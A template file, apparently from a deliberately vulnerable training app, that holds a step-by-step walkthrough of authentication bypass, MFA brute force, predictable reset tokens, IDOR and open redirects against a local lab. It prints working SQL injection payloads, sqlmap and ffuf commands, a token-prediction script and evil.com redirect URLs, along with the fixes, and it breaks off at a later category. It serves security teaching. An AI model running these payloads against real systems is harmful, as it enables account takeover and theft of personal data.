@@ -1,0 +1,1957 @@
+{% extends "base.html" %}
+{% block title %}Walkthrough - Thyhe{% endblock %}
+{% block content %}
+
+<div class="d-flex justify-content-between align-items-center mb-4">
+    <h2><i class="bi bi-mortarboard"></i> Interactive Walkthrough</h2>
+    <div class="d-flex align-items-center gap-3">
+        <span class="text-muted">Progress:</span>
+        <span id="overall-progress" class="text-success fw-bold">0/0</span>
+        <div class="wt-progress" style="width: 150px;">
+            <div id="overall-progress-bar" class="wt-progress-bar" style="width: 0%"></div>
+        </div>
+        <button class="btn btn-sm btn-outline-danger" onclick="resetProgress()" title="Reset all progress"><i class="bi bi-arrow-counterclockwise"></i></button>
+    </div>
+</div>
+
+<nav id="breadcrumb" aria-label="breadcrumb" class="mb-4">
+    <ol class="breadcrumb" id="breadcrumb-list">
+        <li class="breadcrumb-item active">Categories</li>
+    </ol>
+</nav>
+
+<!-- View 1: Category Grid -->
+<div id="view-categories">
+    <p class="text-muted mb-4">Pick a category below and let's start hunting. I will walk you through each vulnerability step by step.</p>
+    <div class="row g-3" id="category-grid"></div>
+</div>
+
+<!-- View 2: Vulnerability List -->
+<div id="view-vulns" style="display:none;">
+    <p class="text-muted mb-3" id="vuln-list-intro"></p>
+    <div id="vuln-list"></div>
+    <button class="btn btn-outline-secondary mt-3" onclick="showCategories()"><i class="bi bi-arrow-left"></i> Back to Categories</button>
+</div>
+
+<!-- View 3: Step Wizard -->
+<div id="view-wizard" style="display:none;">
+    <div id="step-indicator" class="wt-step-indicator"></div>
+    <div id="step-content" class="wt-step-content"></div>
+    <div class="d-flex justify-content-between mt-4">
+        <button id="btn-prev" class="btn btn-outline-secondary" onclick="prevStep()"><i class="bi bi-arrow-left"></i> Previous</button>
+        <button id="btn-complete" class="btn btn-success" onclick="markComplete()" style="display:none;"><i class="bi bi-check-circle"></i> Mark Complete</button>
+        <button id="btn-next" class="btn btn-primary" onclick="nextStep()">Next <i class="bi bi-arrow-right"></i></button>
+    </div>
+</div>
+
+{% raw %}
+<script>
+const STEP_ICONS = [
+    {title: "Where to Look", icon: "bi-geo-alt"},
+    {title: "What to Notice", icon: "bi-eye"},
+    {title: "What to Try", icon: "bi-lightning"},
+    {title: "Expected Result", icon: "bi-check-circle"},
+    {title: "Why It Works", icon: "bi-book"},
+    {title: "Try It Yourself", icon: "bi-play-circle"},
+    {title: "Automate It", icon: "bi-robot"}
+];
+
+const WALKTHROUGH_DATA = {
+categories: [
+{
+    id: "auth",
+    name: "Authentication Bypass",
+    icon: "bi-key",
+    badgeClass: "vuln-auth",
+    description: "Let's break into accounts without knowing the password.",
+    vulns: [
+        {
+            id: "auth-sqli-login",
+            name: "SQL Injection Login Bypass",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">Alright, first things first. Every web app has a login page, and that is always worth poking at. Let's go take a look.</p>
+                <p>Head over to the <a href="/login" target="_blank">Login page</a>. You will see a standard username and password form. Nothing fancy on the surface.</p>`,
+
+                `<p class="wt-mentor-text">Before we try anything wild, let's see how the app reacts to unexpected input.</p>
+                <p>Type a single quote <code>'</code> into the username field and hit submit. If the app shows a database error or behaves differently than a normal "wrong password" message, that is a strong hint that your input is going directly into a SQL query.</p>
+                <p>Also try submitting a valid username like <code>admin</code> with a wrong password, then try a completely fake username. Do you get different error messages? That tells you something too.</p>`,
+
+                `<p class="wt-mentor-text">The login form looks like it builds the SQL query with your input directly. Let's use that.</p>
+                <p>Try this in the username field:</p>
+                <pre>admin'-- </pre>
+                <p>Password can be anything, like <code>x</code>.</p>
+                <p>Or try the classic:</p>
+                <pre>' OR '1'='1' -- </pre>
+                <p>Note the space after the double dash. That is important in SQL.</p>`,
+
+                `<p class="wt-mentor-text">If it worked, you should be logged in without ever knowing the real password.</p>
+                <p>With <code>admin'--</code> you get in as admin and land on the MFA page (admin has MFA enabled). With a non-MFA user, try <code>agarcia'--</code> and you will go straight to the dashboard.</p>
+                <p>If you used <code>' OR '1'='1' --</code>, you might log in as the first user in the database.</p>`,
+
+                `<p class="wt-mentor-text">Here is what is happening behind the scenes.</p>
+                <p>The app builds the query like this:</p>
+                <pre>SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'</pre>
+                <p>When you type <code>admin'--</code>, it becomes:</p>
+                <pre>SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'</pre>
+                <p>The <code>--</code> is a SQL comment. Everything after it gets ignored, including the password check. The database just looks for a user called "admin" and returns it.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/login" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-box-arrow-in-right"></i> Go to Login Page</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenges:</strong></p>
+                <ul>
+                    <li>Can you log in as <code>jsmith</code> or <code>bwilson</code>?</li>
+                    <li>What happens if you use <code>' OR 1=1 --</code> ? Who do you log in as?</li>
+                    <li>Can you use the UNION technique here to extract data?</li>
+                </ul>`,
+
+                `<p class="wt-mentor-text">Let's hand this off to sqlmap and let it do the heavy lifting.</p>
+                <p><strong>Step 1:</strong> Test the injection:</p>
+                <pre>sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -p username --batch</pre>
+                <p><strong>Step 2:</strong> Dump all users once confirmed:</p>
+                <pre>sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -p username --batch -T users --dump</pre>
+                <p><strong>Flags explained:</strong></p>
+                <ul>
+                    <li><code>--data</code> = POST body</li>
+                    <li><code>-p username</code> = only test the username parameter</li>
+                    <li><code>--batch</code> = auto-answer all prompts</li>
+                    <li><code>-T users --dump</code> = dump the users table</li>
+                </ul>
+                <p class="text-warning"><strong>Note:</strong> If the account has MFA, sqlmap might get confused by the redirect to /mfa. Use <code>-p password</code> instead, or target a non-MFA user.</p>`
+            ]
+        },
+        {
+            id: "auth-username-enum",
+            name: "Username Enumeration",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">Before trying to break in, it helps to know who actually has an account. Let's see if the app leaks that information.</p>
+                <p>There are three places to check: <a href="/login" target="_blank">/login</a>, <a href="/register" target="_blank">/register</a>, and <a href="/reset-password" target="_blank">/reset-password</a>.</p>`,
+
+                `<p class="wt-mentor-text">Pay close attention to the error messages. Do they say different things depending on whether the username exists?</p>
+                <p>On the login page, try logging in with <code>admin</code> (real user) and a wrong password. Then try <code>fakeuser12345</code>. Compare the error messages carefully. Even a small wording difference is enough.</p>`,
+
+                `<p class="wt-mentor-text">Let's confirm this across all three endpoints.</p>
+                <p><strong>Login:</strong> Try <code>admin</code> + wrong password, then <code>nonexistentuser</code> + wrong password. Compare responses.</p>
+                <p><strong>Register:</strong> Try registering with username <code>admin</code>. Does it say the name is taken?</p>
+                <p><strong>Reset Password:</strong> Try resetting for <code>admin</code> vs <code>fakeuser12345</code>. Different messages?</p>`,
+
+                `<p class="wt-mentor-text">You should see distinct responses.</p>
+                <p>Login gives "Invalid password" for real users but "User not found" for fake ones. Register says "Username already taken" for existing users. Reset says "No account found" for nonexistent emails.</p>
+                <p>Each of these confirms whether an account exists. An attacker could use Burp Intruder with a wordlist to enumerate valid usernames quickly.</p>`,
+
+                `<p class="wt-mentor-text">This is called username enumeration, and it is a surprisingly common finding.</p>
+                <p>The fix is simple: always return the same message regardless. Something like "If an account exists, we have sent a reset link" gives nothing away. But many apps still get this wrong because developers want to be "helpful" to users.</p>
+                <p>In a real bug bounty, this alone might be low severity, but combined with a brute force attack, it becomes much more dangerous.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/login" target="_blank" class="btn btn-outline-info me-2"><i class="bi bi-box-arrow-in-right"></i> Login</a>
+                    <a href="/register" target="_blank" class="btn btn-outline-info me-2"><i class="bi bi-person-plus"></i> Register</a>
+                    <a href="/reset-password" target="_blank" class="btn btn-outline-info"><i class="bi bi-key"></i> Reset</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenge:</strong> Can you automate this with Burp Intruder or ffuf? Try a wordlist of common names and filter by response length.</p>`,
+
+                `<p class="wt-mentor-text">Let's automate the username enumeration with ffuf.</p>
+                <p><strong>On the login page</strong> (match the error message that only appears for valid users):</p>
+                <pre>ffuf -u http://localhost:5000/login -X POST \\
+  -d "username=FUZZ&password=wrong" \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  -w /usr/share/seclists/Usernames/Names/names.txt \\
+  -mr "Invalid password"</pre>
+                <p>Invalid usernames return "User not found" while valid ones return "Invalid password". The <code>-mr</code> flag matches only responses containing that string, so only valid usernames show up.</p>
+                <p><strong>On the register page:</strong></p>
+                <pre>ffuf -u http://localhost:5000/register -X POST \\
+  -d "username=FUZZ&password=test&email=t@t.com" \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  -w /usr/share/seclists/Usernames/Names/names.txt \\
+  -mr "already taken"</pre>
+                <p><code>-mr "already taken"</code> only shows responses containing that string, which means the username exists.</p>`
+            ]
+        },
+        {
+            id: "auth-mfa-bypass",
+            name: "MFA Bypass via Username Swap",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Some accounts have multi-factor authentication. Sounds secure, right? Let's see how well it is actually implemented.</p>
+                <p>First, you need to reach the MFA page. Log in with <code>admin'--</code> (SQLi bypass) or use valid credentials for an MFA-enabled account. You will be redirected to <a href="/mfa" target="_blank">/mfa</a>.</p>
+                <p><strong>MFA codes:</strong> admin = <code>123456</code>, jsmith = <code>654321</code></p>`,
+
+                `<p class="wt-mentor-text">Look at the page source or intercept the request in Burp. See anything interesting in the form?</p>
+                <p>There is a hidden field with the username. The MFA code is being validated against a code stored in the database, but the username comes from the form, not from the server session. That is a critical design flaw.</p>
+                <p>Also notice that it says "Authenticating as: [username]" on the page. That username is your input.</p>`,
+
+                `<p class="wt-mentor-text">Here is the trick. You can change that hidden username field to any user.</p>
+                <p>Log in as admin (triggers MFA). On the MFA page, open your browser dev tools (F12), find the hidden input named <code>username</code>, and change it to <code>jsmith</code>. Now enter jsmith's MFA code: <code>654321</code>.</p>
+                <p>Or intercept the POST request in Burp Suite and change the username parameter before it gets sent.</p>`,
+
+                `<p class="wt-mentor-text">If it worked, you just authenticated as a completely different user.</p>
+                <p>You should now be logged in as jsmith, even though you started the login flow as admin. The app trusted the username from the form instead of tracking it server-side.</p>`,
+
+                `<p class="wt-mentor-text">This is a classic session binding issue.</p>
+                <p>The MFA implementation validates the code correctly, but it does not bind the code check to the user's session. The username comes from a client-controlled hidden field, so an attacker can swap it. The fix is to store the username in the server session during the login step and never accept it from the client during MFA verification.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/login" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-shield-lock"></i> Start at Login</a>
+                </div>
+                <p class="mt-3"><strong>MFA codes to know:</strong> admin = <code>123456</code>, jsmith = <code>654321</code></p>
+                <p><strong>Extra challenge:</strong> Can you bypass MFA entirely by modifying the POST request to skip the MFA step?</p>`
+            ]
+        },
+        {
+            id: "auth-mfa-brute",
+            name: "MFA Brute Force",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">What if you do not know the MFA code at all? If it is short enough and there is no rate limiting, you might be able to just guess it.</p>
+                <p>Head to the <a href="/mfa" target="_blank">MFA page</a> (log in first to trigger it).</p>
+                <p><strong>MFA codes:</strong> admin = <code>123456</code>, jsmith = <code>654321</code></p>`,
+
+                `<p class="wt-mentor-text">Think about the code format. It is 6 digits, so that is 000000 to 999999. That is a million possibilities, which sounds like a lot, but machines are fast.</p>
+                <p>Try submitting a wrong code a few times. Is there any lockout? Any rate limiting? Any CAPTCHA? If not, you can automate this.</p>`,
+
+                `<p class="wt-mentor-text">Let's set up a brute force with Burp Intruder or ffuf.</p>
+                <p>In Burp, intercept the MFA POST, send it to Intruder, set the code field as the payload position, and use a numeric range from 000000 to 999999. Or with ffuf:</p>
+                <pre>ffuf -u http://localhost:5000/mfa -X POST -d "username=admin&mfa_code=FUZZ" -w numbers.txt -fc 200 -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=YOUR_SESSION"</pre>
+                <p>You can generate the numbers file with: <code>seq -w 000000 999999 > numbers.txt</code></p>`,
+
+                `<p class="wt-mentor-text">When you hit the right code, the response will be a redirect to the dashboard instead of the MFA page with an error.</p>
+                <p>In Burp Intruder, filter by response status code (302 vs 200) or response length. The correct code will stand out.</p>`,
+
+                `<p class="wt-mentor-text">This works because there is zero rate limiting on the MFA endpoint.</p>
+                <p>A 6-digit code has 1,000,000 combinations. With no lockout, an attacker sending 100 requests per second could crack it in under 3 hours. With a 4-digit code, it takes seconds. The fix is to implement rate limiting, account lockout after N failed attempts, and increasing delays between attempts.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/login" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-shield-lock"></i> Go to Login</a>
+                </div>
+                <p class="mt-3"><strong>Tip:</strong> For this lab, admin's code is <code>123456</code> and jsmith's is <code>654321</code>. In a real scenario, you would need to brute force it. The point here is to recognize that no rate limiting + numeric codes = bruteforceable.</p>`,
+
+                `<p class="wt-mentor-text">Let's set up ffuf to brute force the MFA code.</p>
+                <p><strong>Step 1:</strong> Generate a number wordlist:</p>
+                <pre>seq -w 000000 999999 > /tmp/mfa-codes.txt</pre>
+                <p><strong>Step 2:</strong> Log in to trigger MFA, grab your session cookie, then run:</p>
+                <pre>ffuf -u http://localhost:5000/mfa -X POST \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  -H "Cookie: session=YOUR_SESSION" \\
+  -d "username=admin&mfa_code=FUZZ" \\
+  -w /tmp/mfa-codes.txt \\
+  -fc 200</pre>
+                <p><strong>Why <code>-fc 200</code>?</strong> Wrong codes return 200 (the MFA page reloads with an error). The correct code returns 302 (redirect to dashboard). Filtering out 200 leaves only the hit.</p>
+                <p><strong>Faster approach:</strong> If you want to narrow it down, use a smaller range first: <code>seq -w 123400 123500 > /tmp/test.txt</code> to test that ffuf is working before running the full million.</p>`
+            ]
+        },
+        {
+            id: "auth-predictable-reset",
+            name: "Predictable Password Reset Token",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">Password reset flows are a goldmine for attackers. Let's see how this one generates its reset tokens.</p>
+                <p>Go to <a href="/reset-password" target="_blank">/reset-password</a> and request a reset for a known user.</p>`,
+
+                `<p class="wt-mentor-text">After submitting, you get a reset link. Look at the token in that URL carefully. Does it look random? Or does it follow a pattern?</p>
+                <p>Try requesting a reset multiple times and compare the tokens. If they are sequential or based on predictable values (like timestamps or user IDs), that is a vulnerability.</p>
+                <p>The token is an MD5 hash. MD5 of what though?</p>`,
+
+                `<p class="wt-mentor-text">The token is generated from the user's ID and the current Unix timestamp. If you know (or guess) both, you can predict the token.</p>
+                <p>Request a reset and note the exact time. Then generate candidate tokens:</p>
+                <pre>import hashlib, time
+user_id = 1  # admin
+ts = int(time.time())
+for t in range(ts-5, ts+5):
+    token = hashlib.md5(f"{user_id}{t}".encode()).hexdigest()
+    print(f"Try: /reset-password/{token}")</pre>`,
+
+                `<p class="wt-mentor-text">One of those generated tokens should match the real reset link.</p>
+                <p>Visit the matching URL and you will be able to set a new password for that account. You just took over the admin account without any access to their email.</p>`,
+
+                `<p class="wt-mentor-text">Predictable tokens are a critical vulnerability.</p>
+                <p>The reset token is <code>MD5(user_id + unix_timestamp)</code>. Both values are guessable: user IDs are sequential integers, and the timestamp is known within a few seconds of when the request was made. A secure implementation uses a cryptographically random token (like <code>secrets.token_urlsafe(32)</code>) that cannot be predicted.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/reset-password" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-key"></i> Go to Reset Password</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenge:</strong> Write a Python script that requests a reset and then automatically predicts the token within a 10-second window.</p>`
+            ]
+        }
+    ]
+},
+{
+    id: "idor",
+    name: "IDOR / Broken Access Control",
+    icon: "bi-hash",
+    badgeClass: "vuln-idor",
+    description: "Access things you should not be able to see by changing IDs and parameters.",
+    vulns: [
+        {
+            id: "idor-employees",
+            name: "Employee Records (IDOR)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">Let's see if we can access other people's data by just changing a number in the URL.</p>
+                <p>Log in and go to the <a href="/employees" target="_blank">Employees directory</a>. Click on any employee to see their profile.</p>`,
+
+                `<p class="wt-mentor-text">Look at the URL when you view an employee. It is something like <code>/employees/1001</code>. That number is the employee ID. Is there any check on whether you are allowed to view this record?</p>
+                <p>Notice what information is on this page: SSN, salary, home address. Sensitive stuff.</p>`,
+
+                `<p class="wt-mentor-text">Try changing the ID in the URL. Go to <code>/employees/1001</code>, then <code>/employees/1002</code>, <code>/employees/1003</code>, and so on up to 1010.</p>
+                <p>You can also try IDs below 1001 or above 1010 to see what happens with invalid IDs.</p>`,
+
+                `<p class="wt-mentor-text">Every single employee record loads. No permission check at all.</p>
+                <p>You should see full personal details for all 10 employees, including social security numbers, salaries, and addresses. As a regular user, you should only be able to see your own record (if any).</p>`,
+
+                `<p class="wt-mentor-text">This is an Insecure Direct Object Reference (IDOR).</p>
+                <p>The app uses the employee ID directly from the URL to fetch the record from the database, but never checks if the logged-in user is authorized to view it. The fix is to verify that the current user has permission to access the requested resource before returning it.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/employees/1001" target="_blank" class="btn btn-outline-info me-2">Employee 1001</a>
+                    <a href="/employees/1005" target="_blank" class="btn btn-outline-info me-2">Employee 1005</a>
+                    <a href="/employees/1010" target="_blank" class="btn btn-outline-info">Employee 1010</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenge:</strong> Can you automate this with Burp Intruder to dump all employee records at once? Set the ID as the payload position and use a numeric range.</p>`,
+
+                `<p class="wt-mentor-text">Let's use ffuf to dump every employee record automatically.</p>
+                <p><strong>Step 1:</strong> Generate an ID range:</p>
+                <pre>seq 1001 1020 > /tmp/emp-ids.txt</pre>
+                <p><strong>Step 2:</strong> Fuzz the employee endpoint:</p>
+                <pre>ffuf -u http://localhost:5000/employees/FUZZ \\
+  -w /tmp/emp-ids.txt \\
+  -H "Cookie: session=YOUR_SESSION" \\
+  -mc 200</pre>
+                <p>Every 200 response is a valid employee record. Filter out 404s (invalid IDs) automatically with <code>-mc 200</code>.</p>
+                <p><strong>To extract the actual data</strong>, use curl in a loop:</p>
+                <pre>for id in $(seq 1001 1010); do
+  echo "=== Employee $id ==="
+  curl -s -b "session=YOUR_SESSION" \\
+    "http://localhost:5000/employees/$id" | \\
+    grep -oP 'SSN|Salary|Address.*'
+done</pre>`
+            ]
+        },
+        {
+            id: "idor-tickets",
+            name: "Support Tickets (IDOR)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">You found IDOR on employee records. Good. Now the question a real pentester asks is: where else does this app use numeric IDs? Every feature that shows you "your" data by ID is worth testing.</p>
+                <p>Go to <a href="/support" target="_blank">Support</a>. Create a ticket if you do not have one yet, then click to open it.</p>`,
+
+                `<p class="wt-mentor-text">Check the URL: <code>/support/ticket/5</code> (or whatever ID your ticket got). That is a sequential integer, just like the employee IDs. Your ticket might be number 5, but tickets 1 through 4 were created by other users.</p>
+                <p>Think about what information lives in support tickets. People report problems, ask for password resets, share error logs, sometimes paste credentials. This is high-value data if you can read other people's tickets.</p>`,
+
+                `<p class="wt-mentor-text">Walk through the IDs manually: <code>/support/ticket/1</code>, <code>/support/ticket/2</code>, <code>/support/ticket/3</code>.</p>
+                <p>But do not stop at reading. IDOR can affect any action on the resource. Try posting a reply to someone else's ticket:</p>
+                <pre>/support/ticket/1/reply</pre>
+                <p>If you can reply to a ticket you do not own, that is a second IDOR on the same feature. Always test view, edit, delete, and any sub-actions (replies, comments, attachments) separately.</p>`,
+
+                `<p class="wt-mentor-text">Every ticket loads, and you can reply to them too. Two IDOR findings on one feature.</p>
+                <p>In a real engagement, support tickets are goldmines. They frequently contain internal URLs, temporary passwords, infrastructure details, and security incident reports that were never meant for your eyes.</p>`,
+
+                `<p class="wt-mentor-text">The methodology here is: once you find one IDOR, test every CRUD operation on that resource.</p>
+                <p>CRUD stands for Create, Read, Update, Delete. The app might protect one but not the others. For example, maybe only admins can delete tickets, but anyone can read them. Or maybe reading is restricted but replying is not. In your report, each broken action is a separate finding - "unauthorized ticket read" and "unauthorized ticket reply" are two distinct issues.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/support/ticket/1" target="_blank" class="btn btn-outline-info me-2">Ticket #1</a>
+                    <a href="/support/ticket/2" target="_blank" class="btn btn-outline-info me-2">Ticket #2</a>
+                    <a href="/support/ticket/3" target="_blank" class="btn btn-outline-info">Ticket #3</a>
+                </div>`,
+
+                `<p class="wt-mentor-text">Automate it with ffuf to find all valid ticket IDs.</p>
+                <pre>ffuf -u http://localhost:5000/support/ticket/FUZZ \\
+  -w <(seq 1 100) \\
+  -H "Cookie: session=YOUR_SESSION" \\
+  -mc 200</pre>
+                <p><code>&lt;(seq 1 100)</code> generates IDs 1-100 on the fly without creating a file. Every 200 response is a readable ticket. Widen the range if you suspect more exist.</p>`
+            ]
+        },
+        {
+            id: "idor-messages",
+            name: "Private Messages (IDOR)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">Now let's think about impact. Not all IDORs are equal. Accessing someone's public profile via IDOR is low severity. But what about private messages?</p>
+                <p>Go to <a href="/messages" target="_blank">Messages</a>. You will see your inbox. Click on a message to see its detail page URL.</p>`,
+
+                `<p class="wt-mentor-text">The URL is <code>/messages/1</code> or similar. Same sequential integer pattern. But think about what private messages contain in a corporate app: people share passwords with colleagues ("here's the staging server creds"), discuss security issues, forward API keys, share links to internal tools.</p>
+                <p>This is where IDOR goes from "I can see someone's name" to "I can read the admin's inbox."</p>`,
+
+                `<p class="wt-mentor-text">Start changing the message ID: <code>/messages/1</code> through <code>/messages/8</code>.</p>
+                <p>Read through each message carefully. Look for anything sensitive: passwords, access keys, internal hostnames, employee IDs. In a real pentest, this is where you build your next attack - credentials found in messages become your stepping stone to deeper access.</p>`,
+
+                `<p class="wt-mentor-text">You can read every message in the system, including conversations between other users. Notice the messages with shared credentials and internal references. In a real environment, this single IDOR could hand you the keys to multiple other systems.</p>
+                <p>This is why IDOR on private communications is consistently rated high or critical severity in bug bounties, even though the technical exploit is trivially simple.</p>`,
+
+                `<p class="wt-mentor-text">The lesson here is about impact assessment, not just finding the bug.</p>
+                <p>When you write up an IDOR finding, the severity depends on what data is exposed. Employee directory IDOR? Medium at best. Private message IDOR? High or critical, because the attacker gets access to confidential communications. Always demonstrate the worst-case impact in your report - show the message with the shared credentials, not just "I can access message ID 1."</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/messages/1" target="_blank" class="btn btn-outline-info me-2">Message #1</a>
+                    <a href="/messages/2" target="_blank" class="btn btn-outline-info me-2">Message #2</a>
+                    <a href="/messages/5" target="_blank" class="btn btn-outline-info">Message #5</a>
+                </div>`,
+
+                `<p class="wt-mentor-text">Same ffuf pattern for messages.</p>
+                <pre>ffuf -u http://localhost:5000/messages/FUZZ \\
+  -w <(seq 1 50) \\
+  -H "Cookie: session=YOUR_SESSION" \\
+  -mc 200</pre>
+                <p>For all IDOR endpoints, the approach is identical: fuzz the numeric ID with a sequential range and filter for 200 responses. This works on <code>/messages/</code>, <code>/support/ticket/</code>, <code>/employees/</code>, and <code>/profile/</code>.</p>`
+            ]
+        },
+        {
+            id: "idor-profile-view",
+            name: "Profile Viewing (Horizontal)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">There are two types of privilege escalation: vertical (regular user becomes admin) and horizontal (regular user accesses another regular user's data). Profiles are a classic horizontal target.</p>
+                <p>Go to your <a href="/profile" target="_blank">own profile</a>. Look at the URL when it loads. Is it <code>/profile</code> or <code>/profile/3</code>?</p>`,
+
+                `<p class="wt-mentor-text">If the URL includes your user ID, that immediately suggests you can change it. But even if your own profile uses <code>/profile</code> (no ID), the app might still accept <code>/profile/1</code> as a valid route.</p>
+                <p>Try accessing <code>/profile/1</code>. That is likely the admin account (ID 1 is almost always the first user created). What personal information is visible? Email, bio, role, anything else?</p>`,
+
+                `<p class="wt-mentor-text">Walk through the user IDs: <code>/profile/1</code> through <code>/profile/10</code>.</p>
+                <p>Pay attention to what data is exposed on each profile. Some fields might seem harmless (name, bio), but look for email addresses (useful for phishing), role information (tells you who the admins are), and any other details that help you plan your next move.</p>`,
+
+                `<p class="wt-mentor-text">Every profile loads without restriction. You can enumerate all users in the system and see their personal details. This is horizontal privilege escalation: you are not gaining a higher role, but you are accessing data at the same privilege level that belongs to other users.</p>
+                <p>Combined with what you learned from the messages IDOR, you now have a complete picture: who the users are (profiles), what they are saying privately (messages), and their employment details (employee records).</p>`,
+
+                `<p class="wt-mentor-text">Horizontal and vertical are the two axes of access control. Horizontal means "same role, different user's data." Vertical means "low role accessing high role features" (like the admin panel).</p>
+                <p>In a real pentest report, you would list each IDOR separately because they expose different data with different impact. But you would also note the pattern: the entire application lacks authorization checks on direct object references. That systemic finding is often more valuable than any single IDOR.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/profile/1" target="_blank" class="btn btn-outline-info me-2">Profile #1</a>
+                    <a href="/profile/2" target="_blank" class="btn btn-outline-info me-2">Profile #2</a>
+                    <a href="/profile/5" target="_blank" class="btn btn-outline-info">Profile #5</a>
+                </div>`
+            ]
+        },
+        {
+            id: "idor-profile-edit",
+            name: "Edit Other Users' Profiles (Horizontal)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Viewing is one thing, but what if you can actually modify another user's data?</p>
+                <p>Go to <a href="/profile/edit" target="_blank">/profile/edit</a> and inspect the form.</p>`,
+
+                `<p class="wt-mentor-text">Look at the form fields carefully. Is there a hidden <code>user_id</code> field? The app might be using that value to decide whose profile to update, instead of using the server session.</p>
+                <p>Open your browser dev tools (F12) and check the hidden inputs in the form HTML.</p>`,
+
+                `<p class="wt-mentor-text">Change the hidden <code>user_id</code> field to another user's ID (try <code>1</code> for admin). Then submit the form with a new bio or email.</p>
+                <p>You can do this via browser dev tools, or intercept the POST request in Burp and change the <code>user_id</code> parameter.</p>`,
+
+                `<p class="wt-mentor-text">The other user's profile gets updated with your data. You just modified someone else's account.</p>
+                <p>Visit <code>/profile/1</code> to confirm the admin's profile now shows your changes.</p>`,
+
+                `<p class="wt-mentor-text">The app trusts the user_id from the form instead of getting it from the session.</p>
+                <p>The server should always use <code>session['user_id']</code> to determine whose profile to update, never a client-supplied parameter. This is a horizontal privilege escalation that could let you take over accounts by changing their email and triggering a password reset.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/profile/edit" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-pencil"></i> Go to Profile Edit</a>
+                </div>`
+            ]
+        },
+        {
+            id: "idor-admin-panel",
+            name: "Admin Panel Access (Vertical)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">You see that "Admin" link in the nav bar? It is highlighted in yellow, which screams "restricted area." But is it actually restricted?</p>
+                <p>Log in as any regular user and try visiting <a href="/admin" target="_blank">/admin</a> directly.</p>`,
+
+                `<p class="wt-mentor-text">Did you get blocked? Or did the admin panel just... load? If there is no "access denied" message, that means there is no role check on this endpoint.</p>`,
+
+                `<p class="wt-mentor-text">As a regular user, go to <code>/admin</code>. You should see the full admin panel with user management features.</p>
+                <p>Now try the admin actions: you can update user roles at <code>/admin/update-role</code> and even delete users at <code>/admin/delete-user/USER_ID</code>.</p>`,
+
+                `<p class="wt-mentor-text">Full admin access as a regular user. You can promote yourself to admin, delete other accounts, or manage the entire user base.</p>`,
+
+                `<p class="wt-mentor-text">This is vertical privilege escalation, also called broken access control.</p>
+                <p>The route exists and is functional, but there is no check for <code>if user.role != 'admin': abort(403)</code>. The nav link being visible is a UI issue, but the real vulnerability is the missing server-side authorization check. Always check authorization on the server, not just in the UI.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/admin" target="_blank" class="btn btn-outline-warning btn-lg"><i class="bi bi-gear"></i> Go to Admin Panel</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenge:</strong> Can you promote your own account to admin via the update-role endpoint?</p>`
+            ]
+        },
+        {
+            id: "idor-open-redirect",
+            name: "Open Redirects",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">Open redirects might seem harmless, but they are powerful in phishing attacks. Let's find them.</p>
+                <p>Look at the login page URL. After logging in, the app redirects you somewhere. What controls where you go?</p>`,
+
+                `<p class="wt-mentor-text">Check the URL parameters. The login page accepts a <code>next</code> parameter: <code>/login?next=/dashboard</code>. The logout page uses <code>return</code>. And there is a dedicated <code>/redirect?url=</code> endpoint.</p>
+                <p>Are any of these validated?</p>`,
+
+                `<p class="wt-mentor-text">Try these URLs:</p>
+                <pre>/login?next=https://evil.com</pre>
+                <pre>/logout?return=https://evil.com</pre>
+                <pre>/redirect?url=https://evil.com</pre>
+                <p>Log in normally, and see where you end up after authentication.</p>`,
+
+                `<p class="wt-mentor-text">You get redirected to the external URL. In a real attack, the attacker sends the victim a legitimate-looking login link that redirects to a phishing page after authentication.</p>`,
+
+                `<p class="wt-mentor-text">The app does not validate redirect URLs against a whitelist.</p>
+                <p>Any external URL is accepted. The fix is to only allow relative paths (starting with <code>/</code>) or check against a whitelist of allowed domains. Open redirects are often chained with other attacks: an attacker sends a victim a login link that looks like <code>https://real-site.com/login?next=https://phishing-site.com</code>.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/redirect?url=https://example.com" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-box-arrow-up-right"></i> Test /redirect</a>
+                </div>`
+            ]
+        }
+    ]
+},
+{
+    id: "sqli",
+    name: "SQL Injection",
+    icon: "bi-database-exclamation",
